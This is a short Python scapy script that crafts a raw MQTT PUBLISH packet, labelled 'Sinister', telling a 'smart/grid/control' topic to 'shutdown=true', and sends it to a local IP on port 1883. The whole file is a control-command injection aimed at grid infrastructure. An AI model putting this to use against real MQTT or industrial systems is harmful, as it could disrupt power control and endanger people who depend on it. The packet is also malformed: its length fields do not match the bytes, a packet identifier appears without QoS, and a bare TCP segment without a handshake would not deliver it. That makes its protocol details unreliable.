from scapy.all import *

# MQTT PUBLISH Packet - Sinister
mqtt_publish_malicious = (
    b"\x30"              # MQTT Control Packet Type (PUBLISH)
    b"\x2a"              # Remaining Length
    b"\x00\x10"          # Topic Name Length
    b"smart/grid/control" # Topic Name
    b"\x00\x01"          # Packet Identifier
    b"shutdown=true"     # Payload (Example: Malicious control command)
)

# Send sinister packet
send(IP(dst="192.168.226.128")/TCP(dport=1883)/Raw(load=mqtt_publish_malicious))
